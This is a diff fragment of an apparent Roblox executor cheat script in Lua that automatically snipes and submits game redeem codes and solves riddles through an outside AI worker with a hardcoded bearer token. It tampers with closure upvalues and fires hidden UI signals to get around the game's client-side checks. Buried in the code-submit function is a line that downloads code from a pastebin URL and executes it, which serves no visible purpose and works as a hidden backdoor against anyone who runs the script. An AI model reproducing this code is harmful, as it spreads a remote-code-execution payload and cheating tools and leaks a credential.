+            "belohnung",
+            "geschenk",
+            "ratsel",
+            "achtung",
+            "la risposta e",
+            "rispondi",
+            "domanda",
+            "attenzione",
+            "ricompensa",
+            "indovinello",
+            "het antwoord is",
+            "raadsel",
+            "beloning",
+            "odpowiedz to",
+            "zagadka",
+            "nagroda",
+            "cevap",
+            "bilmece",
+            "bulmaca",
+            "odul",
+            "jawabannya",
+            "tebak",
+            "teka teki",
+            "hadiah",
+            "sagot ay",
+            "bugtong",
+            "premyo",
+            "dap an",
+            "tra loi",
+            "phan thuong",
+            "cau do",
+            "raspunsul este",
+            "ghicitoare",
+            "premiu",
+          }
+
+          tbl19.weakSet = nil
+
+          tbl19.isWeak = function(arg)
+            if not tbl19.weakSet then
+              tbl19.weakSet = {}
+
+              for _, v89 in ipairs(tbl19.weak) do
+                local v90 = true
+                tbl19.weakSet[tbl19.normalize(v89):match("^%s*(.-)%s*$")] = v90
+              end
+
+              for _, v89 in ipairs({ "ответ", "загадка", "награда", "приз" }) do
+                tbl19.weakSet[tbl19.normalize(v89):match("^%s*(.-)%s*$")] = true
+              end
+            end
+
+            return tbl19.weakSet[arg] == true
+          end
+
+          tbl19.arm = function(arg)
+            if tbl19.armed then
+              return
+            end
+            tbl19.armed = true
+            tbl19.token = tbl19.token + 1
+            tbl19.window = {}
+
+            if clearAceCapture then
+              clearAceCapture()
+            end
+
+            if tbl19.setTargets then
+              tbl19.setTargets(true)
+            end
+
+            _lastStatusMsg = nil
+            local green = COLORS.Green
+            setStatus('LIVE - heard "' .. tostring(arg) .. '"', green)
+            local token = tbl19.token
+
+            task.delay(tbl19.timeout, function()
+              if tbl19.armed and tbl19.token == token then
+                tbl19.disarm("nothing landed")
+              end
+            end)
+          end
+
+          tbl19.disarm = function()
+            if not tbl19.enabled then
+              return
+            end
+            tbl19.armed = false
+            tbl19.token = tbl19.token + 1
+            local cooldown = tbl19.cooldown
+            tbl19.readyAt = os.clock() + cooldown
+            tbl19.window = {}
+
+            if clearAceCapture then
+              clearAceCapture()
+            end
+
+            if tbl19.setTargets then
+              tbl19.setTargets(false)
+            end
+
+            _lastStatusMsg = nil
+            setStatus("Sniper + riddles OFF - waiting for Sammy", COLORS.Dim)
+          end
+
+          tbl19.setEnabled = function(arg)
+            tbl19.enabled = arg and true or false
+            tbl19.armed = false
+            tbl19.token = tbl19.token + 1
+            tbl19.readyAt = 0
+            tbl18.autoListen = tbl19.enabled
+            fn31()
+
+            if tbl19.setTargets then
+              if tbl19.enabled then
+                tbl19.setTargets(false)
+              else
+                tbl19.setTargets(nil)
+              end
+            end
+
+            if tbl19.refreshRow then
+              tbl19.refreshRow()
+            end
+          end
+
+          tbl19.yield = function()
+            if tbl19.driving or not tbl19.enabled then
+              return
+            end
+            tbl19.enabled = false
+            tbl19.armed = false
+            tbl19.token = tbl19.token + 1
+            tbl18.autoListen = false
+            fn31()
+
+            if tbl19.refreshRow then
+              tbl19.refreshRow()
+            end
+
+            _lastStatusMsg = nil
+            setStatus("Auto listen off - manual control", COLORS.Dim)
+          end
+
+          codeSniper = tbl18.codeSniper
+
+          if tbl19.enabled then
+            codeSniper = false
+          end
+
+          tbl20 = {}
+          v80 = nil
+          v81 = nil
+          autoSubmit = tbl18.autoSubmit
+          aiAutoSubmit = tbl18.aiAutoSubmit
+          backupRiddle = tbl18.backupRiddle
+
+          if backupRiddle and not aiAutoSubmit then
+            aiAutoSubmit = true
+            tbl18.aiAutoSubmit = true
+            fn31()
+          end
+
+          submitAfter = tbl18.submitAfter
+          tbl21 = {}
+          n33 = 0
+          n34 = 0
+          n35 = 0
+          v82 = nil
+          connection = nil
+          connection2 = nil
+          tbl22 = {}
+          retypeInvalid = tbl18.retypeInvalid
+
+          if backupRiddle and retypeInvalid then
+            retypeInvalid = false
+            tbl18.retypeInvalid = false
+            fn31()
+          end
+
+          riddleSolver = tbl18.riddleSolver
+          n36 = 0
+
+          if tbl19.enabled then
+            riddleSolver = false
+          end
+
+          str7 = ""
+          v83 = nil
+          v84 = nil
+          n37 = 0
+          v85 = 0
+          tbl23 = { "Codes", "Codes", "CodeRedeem", "TextBox" }
+          fn32 = nil
+          fn33 = nil
+          fn34 = nil
+          fn35 = nil
+          str8 = nil
+          net = v75:WaitForChild("Packages"):WaitForChild("Net")
+          getupvalues_ = debug and debug.getupvalues or getupvalues
+          local v89 = getconnections
+          local getconnections_
+
+          if v89 then
+            getconnections_ = v89
+          else
+            getconnections_ = debug and debug.getconnections
+          end
+
+          local setupvalue_ = debug and debug.setupvalue or setupvalue
+          local v90 = nil
+          v86 = nil
+          n38 = 0
+          flag16 = false
+          flag17 = false
+          n39 = 0
+          local v91 = nil
+
+          fn36 = function()
+            if v91 then
+              return v91
+            end
+            local v92 = nil
+
+            local function fn46(arg)
+              if v92 then
+                return
+              end
+              local ok, result = pcall(arg)
+
+              if ok and type(result) == "function" then
+                v92 = result
+              end
+            end
+
+            fn46(function()
+              return request
+            end)
+
+            fn46(function()
+              return http_request
+            end)
+
+            fn46(function()
+              return httprequest
+            end)
+
+            fn46(function()
+              return syn and syn.request
+            end)
+
+            fn46(function()
+              return http and http.request
+            end)
+
+            fn46(function()
+              return fluxus and fluxus.request
+            end)
+
+            fn46(function()
+              return krnl and krnl.request
+            end)
+
+            local genv3 = nil
+
+            pcall(function()
+              if type(getgenv) == "function" then
+                genv3 = getgenv()
+              end
+            end)
+
+            if genv3 then
+              fn46(function()
+                return genv3.request
+              end)
+
+              fn46(function()
+                return genv3.http_request
+              end)
+
+              fn46(function()
+                return genv3.httprequest
+              end)
+
+              fn46(function()
+                return genv3.syn and genv3.syn.request
+              end)
+
+              fn46(function()
+                return genv3.http and genv3.http.request
+              end)
+
+              fn46(function()
+                return genv3.fluxus and genv3.fluxus.request
+              end)
+            end
+
+            v91 = v92
+            return v92
+          end
+
+          fn37 = function()
+            local str9 = nil
+
+            pcall(function()
+              local v92 = "function"
+
+              if type(identifyexecutor) == v92 then
+                str9 = tostring(identifyexecutor())
+              else
+                local v93 = "function"
+
+                if type(getexecutorname) == v93 then
+                  str9 = tostring(getexecutorname())
+                end
+              end
+            end)
+
+            local v92 = "function"
+            if type(str9) ~= v92 or str9 == "" then
+              return "this executor"
+            end
+            return str9
+          end
+
+          tbl24 = {
+            Enabled = true,
+            AIRiddles = true,
+            AutoTypeCodes = true,
+            AutoSubmit = true,
+            SubmitAfter = 3,
+            AIAutoSubmit = true,
+            RaceModels = false,
+            PrimaryModel = "gemini-3.1-flash-lite",
+            BackupModel = "gemini-3.1-flash-lite",
+            RiddleURL = "https://qwen-riddle-solver.kellygrant0527.workers.dev",
+            RiddleToken = "OU5sbdQj9CWPkaPRIiCby2icOmR_Q4zMQt9ZX58TOWE",
+          }
+
+          fn38 = function(arg, arg2)
+            local v92 = fn36()
+            if not v92 then
+              return { error = "no HTTP function on " .. fn37() .. " - AI riddles need request / http_request" }
+            end
+            local str9 = tbl24.RiddleURL:gsub("/+$", "")
+            local str10 = "/" .. tostring(arg):gsub("^/+", "")
+            local json = v88:JSONEncode(arg2)
+            local tbl26 = { ["Content-Type"] = "application/json", Authorization = "Bearer " .. tbl24.RiddleToken }
+
+            local ok, result, result2 = pcall(v92, {
+              Url = str9 .. str10,
+              url = str9 .. str10,
+              Method = "POST",
+              method = "POST",
+              Headers = tbl26,
+              headers = tbl26,
+              Body = json,
+              body = json,
+            })
+
+            if not ok then
+              local ok2, result3
+              ok2, result3, result2 = pcall(v92, { Url = str9 .. str10, Method = "POST", Headers = tbl26, Body = json })
+              if not ok2 then
+                return { error = "HTTP request failed: " .. tostring(result) }
+              end
+              result = result3
+            end
+
+            local body, httpStatus
+
+            if type(result) == "string" then
+              body = result
+              httpStatus = tonumber(result2)
+            else
+              if type(result) ~= "table" then
+                return { error = "executor returned no HTTP response" }
+              end
+
+              httpStatus = tonumber(result.StatusCode or result.Status or result.status_code or result.statusCode)
+              body = result.Body or result.body or result.Response or result.response
+            end
+
+            if type(body) ~= "string" then
+              return { error = "Worker returned no response body", httpStatus = httpStatus }
+            end
+
+            local ok2, result3 = pcall(function()
+              return v88:JSONDecode(body)
+            end)
+
+            if ok2 and type(result3) == "table" then
+              result3.httpStatus = httpStatus
+              return result3
+            end
+            return { error = "Worker returned invalid JSON", httpStatus = httpStatus }
+          end
+
+          fn39 = function(arg)
+            if arg == nil then
+              return nil
+            end
+            local str9 = tostring(arg):upper():gsub("[%s%?%.%,!\"'`\n\r]+", "")
+            if str9 == "" then
+              return nil
+            end
+            return str9
+          end
+
+          fn40 = function()
+            local function fn46(arg)
+              return typeof(arg) == "Instance" and arg:IsA("TextBox") and arg.Parent ~= nil
+            end
+
+            local function fn47(arg)
+              return fn46(arg) and arg.Parent.Name == "CodeRedeem"
+            end
+
+            local function fn48(arg)
+              while arg do
+                if arg:IsA("GuiObject") and arg.Visible == false then
+                  return false
+                end
+
+                if arg:IsA("ScreenGui") and arg.Enabled == false then
+                  return false
+                end
+                arg = arg.Parent
+              end
+
+              return true
+            end
+
+            local focusedTextBox = v78:GetFocusedTextBox()
+            if fn47(focusedTextBox) then
+              return focusedTextBox
+            end
+            local v92 = nil
+
+            for _, descendant in ipairs(playerGui:GetDescendants()) do
+              if fn47(descendant) then
+                if fn48(descendant) then
+                  return descendant
+                end
+                v92 = v92 or descendant
+              end
+            end
+
+            local codes = playerGui:FindFirstChild("Codes")
+
+            if codes then
+              local codeRedeem = (codes:FindFirstChild("Codes") or codes):FindFirstChild("CodeRedeem")
+              local textBox = codeRedeem and codeRedeem:FindFirstChild("TextBox")
+              if fn46(textBox) then
+                return textBox
+              end
+
+              for _, descendant in ipairs(codes:GetDescendants()) do
+                if fn46(descendant) then
+                  return descendant
+                end
+              end
+            end
+
+            return v92
+          end
+
+          local function fn46()
+            if v90 and v90.Parent then
+              return v90
+            end
+            local RemoteFunction = aceRemoteMapper:Resolve("RemoteFunction", "7d14a912-1040-4867-b005-98838eb9acc4", 2.5)
+            if typeof(RemoteFunction) == "Instance" and RemoteFunction:IsA("RemoteFunction") then
+              v90 = RemoteFunction
+              return v90
+            end
+            local ok, result = pcall(require, net)
+
+            if ok and type(result) == "table" then
+              local ok2, result2 = pcall(function()
+                return result:RemoteFunction("7d14a912-1040-4867-b005-98838eb9acc4")
+              end)
+
+              local flag18
+
+              if ok2 then
+                local v92 = "Instance"
+                flag18 = typeof(result2) == v92
+              else
+                flag18 = ok2
+              end
+
+              if flag18 and result2:IsA("RemoteFunction") then
+                if aceRemoteMapper:IsSentinel(result2.Name) then
+                  aceRemoteMapper:Trip("sentinel redeem remote")
+                else
+                  v90 = result2
+                  aceRemoteMapper:Register("RemoteFunction", "7d14a912-1040-4867-b005-98838eb9acc4", result2)
+                end
+              end
+            end
+
+            return v90
+          end
+
+          local function fn47(arg)
+            if not (arg and setupvalue_ and getupvalues_) then
+              return
+            end
+            local ok, result = pcall(getupvalues_, arg)
+
+            if ok and type(result) == "table" then
+              for k, v92 in pairs(result) do
+                if type(v92) == "boolean" then
+                  pcall(setupvalue_, arg, k, false)
+                end
+              end
+            end
+          end
+
+          fn41 = function(text)
+            if not getconnections_ then
+              return false, "no getconnections"
+            end
+            local v92 = fn40()
+            if not v92 then
+              return false, "no codebox"
+            end
+            local ok, result = pcall(getconnections_, v92.FocusLost)
+            if not ok or type(result) ~= "table" or #result == 0 then
+              return false, "no connection"
+            end
+            local flag18 = false
+            loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
+            for _, v93 in ipairs(result) do
+              local function_ = nil
+
+              pcall(function()
+                function_ = v93.Function
+              end)
+
+              fn47(function_)
+              v92.Text = text
+              v92.Active = true
+              v92.Selectable = true
+              local flag19 = true
+
+              pcall(function()
+                flag19 = v93.Enabled ~= false
+              end)
+
+              local ok2 = flag19 and pcall(function()
+                v93:Fire(true)
+              end)
+
+              if flag19 and ok2 then
+                flag18 = true
+                break
+              else
+              end
+            end
+
+            return flag18, flag18 and "sent" or "fire failed"
+          end
+
+          fn42 = function()
+            return v78.TouchEnabled and not v78.KeyboardEnabled
+          end
+
+          local function fn48(arg)
+            while arg do
+              if arg:IsA("GuiObject") and not arg.Visible then
+                return false
+              end
+
+              if arg:IsA("ScreenGui") then
+                return arg.Enabled
+              end
+              arg = arg.Parent
+            end
+
+            return true
+          end
+
+          local function fn49(arg)
+            if not arg then
+              return false
+            end
+
+            local ok = pcall(function()
+              arg.MouseButton1Click:Fire()
+            end)
+
+            ok = ok or false
+
+            local ok2 = pcall(function()
+              arg.Activated:Fire()
+            end) or ok
+
+            if type(firesignal) == "function" then
+              local ok3 = pcall(firesignal, arg.MouseButton1Click) or ok2
+              ok2 = pcall(firesignal, arg.Activated) or ok3
+            end
+
+            if getconnections_ then
+              for _, v92 in ipairs({ arg.MouseButton1Click, arg.Activated }) do
+                local ok3, result = pcall(getconnections_, v92)
+
+                if ok3 and type(result) == "table" then
+                  for _, v93 in ipairs(result) do
+                    local flag18 = true
+
+                    pcall(function()
+                      flag18 = v93.Enabled ~= false
+                    end)
+
+                    if flag18 then
+                      ok2 = pcall(function()
+                        v93:Fire()
+                      end) or ok2
+                    end
+                  end
+                end
+              end
+            end
+
+            if type(fireclick) == "function" then
+              ok2 = pcall(fireclick, arg) or ok2
+            end
+
+            return ok2
+          end
+
+          local function fn50(arg)
+            local ok = false
+
+            if type(firesignal) == "function" then
+              ok = pcall(firesignal, arg.FocusLost, true) or ok
+            end
+
+            local v92
+
+            if getconnections_ then
+              local ok2, result = pcall(getconnections_, arg.FocusLost)
+
+              if ok2 and type(result) == "table" then
+                for _, v93 in ipairs(result) do
+                  local function_ = nil
+
+                  pcall(function()
+                    function_ = v93.Function
+                  end)
+
+                  fn47(function_)
+                  local flag18 = true
+
+                  pcall(function()
+                    flag18 = v93.Enabled ~= false
+                  end)
+
+                  if flag18 then
+                    ok = pcall(function()
+                      v93:Fire(true)
+                    end) or ok
+                  end
+                end
+
+                v92 = ok
+              else
+                v92 = ok
+              end
+            else
+              v92 = ok
+            end
+
+            return v92
+          end
+
+          fn43 = function(text)
+            local codes = playerGui:FindFirstChild("Codes")
+            if not codes then
+              return false, "no codes gui"
+            end
+
+            if codes:IsA("ScreenGui") then
+              codes.Enabled = true
+            end
+
+            local codes2 = codes:FindFirstChild("Codes") or codes
+
+            if codes2:IsA("GuiObject") then
+              codes2.Visible = true
+            end
+
+            local v92 = fn40()
+            if not v92 then
+              return false, "no codebox"
+            end
+            v92.Text = text
+            v92.Active = true
+            v92.Selectable = true
+            task.wait(0.1)
+            local v93 = nil
+
+            for _, descendant in ipairs(codes2:GetDescendants()) do
+              if (descendant:IsA("TextButton") or descendant:IsA("ImageButton")) and fn48(descendant) then
+                local str9 = descendant.Name:lower()
+                local str10 = ""
+
+                pcall(function()
+                  str10 = descendant.Text:lower()
+                end)
+
+                if
+                  str9:find("submit", 1, true)
+                  or str9:find("redeem", 1, true)
+                  or str9:find("claim", 1, true)
+                  or str9:find("confirm", 1, true)
+                  or str9:find("enter", 1, true)
+                  or str10:find("submit", 1, true)
+                  or str10:find("redeem", 1, true)
+                  or str10:find("claim", 1, true)
+                  or str10:find("confirm", 1, true)
+                  or str10:find("enter", 1, true)
+                then
+                  v93 = descendant
+                  break
+                else
+                  v93 = nil
+                end
+              else
+                v93 = nil
+              end
+            end
+
+            local v94 = fn49(v93)
+            local v95 = fn50(v92)
+            return v94 or v95, (v94 or v95) and "submitted via mobile auto-enter" or "mobile auto-enter failed"
+          end
+
+          fn44 = function(arg)
+            local v92 = fn46()
+            if not v92 then
+              return false, "no remote", false
+            end
+
+            local ok, result, result2 = pcall(function()
+              return v92:InvokeServer(arg)
+            end)
+
+            if not ok then
+              return false, tostring(result), false
+            end
+            result2 = type(result2) == "string" and result2 or nil
+            if result == false then
+              return false, result2 or "rejected", true
+            end
+            return true, result2 or result, true
+          end
+        end
+
+        local fn45
+
+        fn45 = function(arg)
+          n39 += 1
+          local v87 = n39
+          v86 = arg
+          n38 = os.clock()
+          flag16 = false
+          flag17 = false
+
+          task.delay(12, function()
+            if v87 == n39 then
+              v86 = nil
+              flag17 = false
+            end
+          end)
+
+          if fn42() then
+            return fn43(arg)
+          end
+          local v88, v89 = fn41(arg)
+          if v88 then
+            return true, v89
+          end
+          local v90, v91 = fn44(arg)
+          if v90 then
+            return true, v91
+          end
+          return false, v91 or v89
+        end
+
+        local tbl25
+
+        tbl25 = {
+          Window = Color3.fromRGB(6, 6, 7),
+          Row = Color3.fromRGB(15, 15, 17),
+          Control = Color3.fromRGB(35, 35, 39),
+          Log = Color3.fromRGB(10, 10, 16),
+          Border = Color3.fromRGB(82, 82, 89),
+          White = Color3.fromRGB(245, 245, 245),
+          Text = Color3.fromRGB(190, 190, 196),
+          Dim = Color3.fromRGB(120, 120, 130),
+          Accent = Color3.fromRGB(245, 245, 245),
+          Green = Color3.fromRGB(70, 210, 100),
+          Red = Color3.fromRGB(255, 70, 70),
+        }
+
+        local fn46
+
+        fn46 = function(parent, arg)
+          local instance = Instance.new("UICorner")
+          instance.CornerRadius = UDim.new(0, arg)
+          instance.Parent = parent
+          return instance
+        end
+
+        local createUIStroke2
+
+        createUIStroke2 = function(parent, color, thickness, transparency)
+          local uiStroke = Instance.new("UIStroke")
+          uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+          uiStroke.Color = color
+          uiStroke.Thickness = thickness or 1
+          uiStroke.Transparency = transparency or 0
+          uiStroke.Parent = parent
+          return uiStroke
+        end
+
+        local createTextLabel
+
+        createTextLabel = function(parent, name, text, size, position, textSize, textColor3, font)
+          local textLabel = Instance.new("TextLabel")
+          textLabel.Name = name
+          textLabel.Size = size
+          textLabel.Position = position
+          textLabel.BackgroundTransparency = 1
+          textLabel.Text = text
+          textLabel.TextSize = textSize
+          textLabel.TextColor3 = textColor3
+          textLabel.Font = font or Enum.Font.GothamMedium
+          textLabel.TextXAlignment = Enum.TextXAlignment.Left
+          textLabel.TextYAlignment = Enum.TextYAlignment.Center
+          textLabel.Parent = parent
+          return textLabel
+        end
+
+        local fn47
+
+        fn47 = function(parent)
+          local uiScale = Instance.new("UIScale")
+          uiScale.Name = "PressScale"
+          uiScale.Parent = parent
+
+          parent.MouseButton1Down:Connect(function()
+            v77:Create(uiScale, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.92 }):Play()
+          end)
+
+          local function fn48()
+            v77:Create(uiScale, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
+            return
+          end
+
+          parent.MouseButton1Up:Connect(fn48)
+          parent.MouseLeave:Connect(fn48)
+        end
+
+        fn30(playerGui, "ACECodeSniperUI", "AutoTypeCodesUI", "ACEPaste")
+        local screenGui2
+        screenGui2 = Instance.new("ScreenGui")
+        screenGui2.Name = "ACECodeSniperUI"
+        screenGui2.ResetOnSpawn = false
+        screenGui2.IgnoreGuiInset = true
+        screenGui2.DisplayOrder = 2147483646
+        screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+        pcall(function()
+          screenGui2.OnTopOfCoreBlur = true
+        end)
+
+        fn29(screenGui2, playerGui)
+
+        if getgenv then
+          getgenv().ACECodeSniperGui = screenGui2
+        end
+
+        local frame2
+        frame2 = Instance.new("Frame")
+        frame2.Name = "Window"
+        frame2.Size = UDim2.fromOffset(310, 446)
+        frame2.AnchorPoint = Vector2.new(1, 0)
+
+        if tbl18.windowPosition then
+          local windowPosition = tbl18.windowPosition
+          frame2.Position = UDim2.new(windowPosition.xScale, windowPosition.xOffset, windowPosition.yScale, windowPosition.yOffset)
+        else
+          frame2.Position = UDim2.new(1, -8, 0, 8)
+        end
+
+        frame2.BackgroundColor3 = tbl25.Window
+        frame2.BorderSizePixel = 0
+        frame2.ClipsDescendants = true
+        frame2.Parent = screenGui2
+        fn46(frame2, 14)
+        createUIStroke2(frame2, tbl25.White, 1, 0.58)
+        local uiScale
+        uiScale = Instance.new("UIScale")
+        uiScale.Name = "InterfaceScale"
+        uiScale.Scale = tbl18.guiScale * n32
+        uiScale.Parent = frame2
+        local fn48
+
+        do
+          local connection3 = nil
+
+          fn48 = function()
+            local scale = tbl18.guiScale * n32
+            local currentCamera = workspace.CurrentCamera
+            if not currentCamera then
+              uiScale.Scale = scale
+              return
+            end
+            local viewportSize = currentCamera.ViewportSize
+            local n40 = math.min(
+              (viewportSize.X - 16) / 310,
+              (viewportSize.Y - 16) / math.max(tonumber(frame2:GetAttribute("ACEWindowHeight")) or 446, 260)
+            )
+            uiScale.Scale = math.max(flag15 and 0.28 or 0.35, math.min(scale, n40))
+          end
+
+          local function fn49()
+            if connection3 then
+              connection3:Disconnect()
+              connection3 = nil
+            end
+
+            local currentCamera = workspace.CurrentCamera
+
+            if currentCamera then
+              connection3 = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn48)
+            end
+
+            fn48()
+          end
+
+          workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(fn49)
+          fn49()
+        end
+
+        local imageLabel
+        imageLabel = Instance.new("ImageLabel")
+        imageLabel.Name = "Background"
+        imageLabel.Size = UDim2.new(1, 0, 1, 0)
+        imageLabel.Position = UDim2.fromOffset(0, 0)
+        imageLabel.BackgroundTransparency = 1
+        local tbl26
+
+        tbl26 = {
+          { Name = "NONE", Image = "", IsNone = true },
+          { Name = "1", Image = "rbxassetid://137692455767789" },
+          { Name = "2", Image = "rbxassetid://128081130356834" },
+          { Name = "3", Image = "rbxassetid://120480454937730" },
+          { Name = "4", Image = "rbxassetid://85127407374728" },
+          { Name = "5", Image = "rbxassetid://107291541054530" },
+          { Name = "6", Image = "rbxassetid://124230165619007" },
+          { Name = "7", Image = "rbxassetid://87766822871097" },
+          { Name = "8", Image = "rbxassetid://90280869222992" },
+          { Name = "9", Image = "rbxassetid://126860692354524" },
+          { Name = "10", Image = "rbxassetid://105131079571166" },
+          { Name = "11", Image = "rbxassetid://108751216016989" },
+        }
+
+        tbl18.backgroundIndex = math.clamp(tbl18.backgroundIndex, 1, #tbl26)
+        local v87 = tbl26[tbl18.backgroundIndex]
+        imageLabel.Image = v87.Image
+        imageLabel.Visible = not v87.IsNone
+        imageLabel.ImageTransparency = 0
+        imageLabel.ScaleType = Enum.ScaleType.Stretch
+        imageLabel.ZIndex = 1
+        imageLabel.Parent = frame2
+        fn46(imageLabel, 14)
+
+        do
+          local v88 = createFrame
+
+          local tbl27 = {
+            Count = flag15 and 7 or v78.TouchEnabled and not v78.KeyboardEnabled and 10 or 14,
+            ZIndex = 90,
+            MinDuration = 5.8,
+            MaxDuration = 9.2,
+          }
+
+          local visible = tbl18.optimization.fallingParticles ~= false
+          v88(frame2, tbl27).Visible = visible
+        end
+
+        local frame3
+        frame3 = Instance.new("Frame")
+        frame3.Name = "Header"
+        frame3.Size = UDim2.new(1, 0, 0, 64)
+        frame3.BackgroundTransparency = 1
+        frame3.Active = true
+        frame3.ZIndex = 3
+        frame3.Parent = frame2
+        local instance
+        instance = nil
+        local textLabel
+        textLabel = nil
+        local tbl27
+        tbl27 = {}
+        local v88
+        v88 = 0
+        local fn49
+        fn49 = nil
+        local tbl28, tbl29, fn50
+        local n40 = 0
+
+        tbl28 = {
+          chromeH = 98,
+          footerBand = 37,
+          statusH = 12,
+          statusGap = 6,
+          clearRowH = 28,
+          clearRow = nil,
+          maxContent = 362,
+          tabHeights = { MAIN = 446, FARM = 236, SETTINGS = 402 },
+          activeTab = "MAIN",
+          windowHeight = 446,
+          minimized = false,
+          gap = 8,
+          notifHeaderH = 24,
+          notifCollapsedH = 58,
+          consoleWant = 150,
+          consoleMin = 26,
+          sectionHeaderH = 30,
+          rowH = 27,
+          rowsMin = 90,
+          rowCount = 0,
+          groupH = 20,
+          rowsHeight = 0,
+          notifOpen = false,
+          settingsOpen = true,
+          notifSeen = false,
+          makeSwitch = function(parent, arg, arg2, arg3)
+            local tbl30 = arg3 or {}
+            local size = tbl30.size or UDim2.fromOffset(34, 18)
+            local offset = size.Y.Offset
+            local n41 = offset - 4
+            local udim2 = UDim2.new(1, -(n41 + 2), 0.5, -n41 / 2)
+            local udim22 = UDim2.new(0, 2, 0.5, -n41 / 2)
+            local textButton = Instance.new("TextButton")
+            textButton.Name = "State"
+            textButton.Size = size
+            textButton.Position = tbl30.position or UDim2.new(1, -46, 0.5, -offset / 2)
+            textButton.BackgroundColor3 = arg and tbl25.Accent or tbl25.Control
+            textButton.BorderSizePixel = 0
+            textButton.AutoButtonColor = false
+            textButton.Text = ""
+            textButton.ZIndex = tbl30.zIndex or 6
+            textButton.Parent = parent
+            fn46(textButton, offset / 2)
+            local v89 = createUIStroke2(textButton, tbl25.White, 1, arg and 0.62 or 0.88)
+            fn47(textButton)
+            local frame4 = Instance.new("Frame")
+            frame4.Name = "Knob"
+            frame4.Size = UDim2.fromOffset(n41, n41)
+            frame4.Position = arg and udim2 or udim22
+            frame4.BackgroundColor3 = arg and tbl25.Window or tbl25.White
+            frame4.BorderSizePixel = 0
+            frame4.ZIndex = (tbl30.zIndex or 6) + 1
+            frame4.Parent = textButton
+            fn46(frame4, n41 / 2)
+            local tbl31 = { state = arg and true or false }
+
+            local function fn51()
+              local tweenInfo = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+              v77:Create(textButton, tweenInfo, { BackgroundColor3 = tbl31.state and tbl25.Accent or tbl25.Control }):Play()
+              v77:Create(v89, tweenInfo, { Transparency = tbl31.state and 0.62 or 0.88 }):Play()
+              v77
+                :Create(
+                  frame4,
+                  tweenInfo,
+                  { BackgroundColor3 = tbl31.state and tbl25.Window or tbl25.White, Position = tbl31.state and udim2 or udim22 }
+                )
+                :Play()
+            end
+
+            tbl31.Set = function(state, arg4)
+              state = state and true or false
+              if state == tbl31.state then
+                return
+              end
+              tbl31.state = state
+              fn51()
+
+              if not arg4 and arg2 then
+                arg2(state)
+              end
+            end
+
+            tbl31.Force = function(arg4)
+              tbl31.state = arg4 and true or false
+              fn51()
+            end
+
+            tbl31.Toggle = function()
+              tbl31.Set(not tbl31.state)
+            end
+
+            textButton.MouseButton1Click:Connect(tbl31.Toggle)
+
+            if tbl30.rowClick then
+              parent.Active = true
+
+              parent.InputBegan:Connect(function(input)
+                if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
+                  return
+                end
+                local position = input.Position
+                local absolutePosition = textButton.AbsolutePosition
+                local absoluteSize = textButton.AbsoluteSize
+                if
+                  position.X >= absolutePosition.X
+                  and position.X <= absolutePosition.X + absoluteSize.X
+                  and position.Y >= absolutePosition.Y
+                  and position.Y <= absolutePosition.Y + absoluteSize.Y
+                then
+                  return
+                end
+                tbl31.Toggle()
+              end)
+            end
+
+            return tbl31
+          end,
+          autoTypeSwitches = {},
+          syncAutoType = function(arg, arg2)
+            for _, autoTypeSwitche in ipairs(tbl28.autoTypeSwitches) do
+              if arg2 then
+                autoTypeSwitche.Force(arg)
+              else
+                autoTypeSwitche.Set(arg, true)
+              end
+            end
+          end,
+          makeGroupRow = function(arg)
+            tbl28.rowCount = tbl28.rowCount + 1
+            tbl28.rowsHeight = tbl28.rowsHeight + tbl28.groupH
+            local frame4 = Instance.new("Frame")
+            frame4.Name = "Group" .. arg
+            frame4.Size = UDim2.new(1, 0, 0, tbl28.groupH)
+            frame4.BackgroundTransparency = 1
+            frame4.LayoutOrder = tbl28.rowCount
+            frame4.ZIndex = 5
+            frame4.Parent = tbl28.rows
+            local frame5 = Instance.new("Frame")
+            frame5.Name = "Dash"
+            frame5.Size = UDim2.fromOffset(10, 1)
+            frame5.Position = UDim2.new(0, 14, 0.5, 0)
+            frame5.BackgroundColor3 = tbl25.Dim
+            frame5.BorderSizePixel = 0
+            frame5.ZIndex = 6
+            frame5.Parent = frame4
+            local white = tbl25.White
+            local gothamBold = Enum.Font.GothamBold
+            createTextLabel(frame4, "Title", arg, UDim2.fromOffset(60, tbl28.groupH), UDim2.fromOffset(30, 0), 9, white, gothamBold).ZIndex =
+              6
+            local frame6 = Instance.new("Frame")
+            frame6.Name = "Rule"
+            frame6.Size = UDim2.new(1, -106, 0, 1)
+            frame6.Position = UDim2.new(0, 92, 0.5, 0)
+            frame6.BackgroundColor3 = tbl25.Dim
+            frame6.BackgroundTransparency = 0.2
+            frame6.BorderSizePixel = 0
+            frame6.ZIndex = 6
+            frame6.Parent = frame4
+            return frame4
+          end,
+          newRow = function(arg, arg2)
+            tbl28.rowCount = tbl28.rowCount + 1
+            tbl28.rowsHeight = tbl28.rowsHeight + tbl28.rowH
+            local instance2 = Instance.new("Frame")
+            instance2.Name = "Row" .. tostring(tbl28.rowCount)
+            instance2.Size = UDim2.new(1, 0, 0, tbl28.rowH)
+            instance2.BackgroundTransparency = 1
+            instance2.LayoutOrder = tbl28.rowCount
+            instance2.ZIndex = 5
+            instance2.Parent = tbl28.rows
+            local text = tbl25.Text
+            local gothamMedium = Enum.Font.GothamMedium
+            local v89 = 6
+            createTextLabel(instance2, "Title", arg, UDim2.new(1, arg2, 1, 0), UDim2.fromOffset(14, 0), 10, text, gothamMedium).ZIndex = v89
+            return instance2
+          end,
+          makeRow = function(arg, arg2, arg3)
+            return tbl28.makeSwitch(tbl28.newRow(arg, -80), arg2, arg3, { rowClick = true })
+          end,
+          makeChoiceRow = function(arg, arg2, arg3, arg4)
+            local v89 = tbl28.newRow(arg, -135)
+            local frame4 = Instance.new("Frame")
+            frame4.Name = "Choices"
+            frame4.Size = UDim2.fromOffset(105, 24)
+            frame4.Position = UDim2.new(1, -117, 0.5, -16)
+            frame4.BackgroundColor3 = tbl25.Log
+            frame4.BackgroundTransparency = 0.05
+            frame4.BorderSizePixel = 0
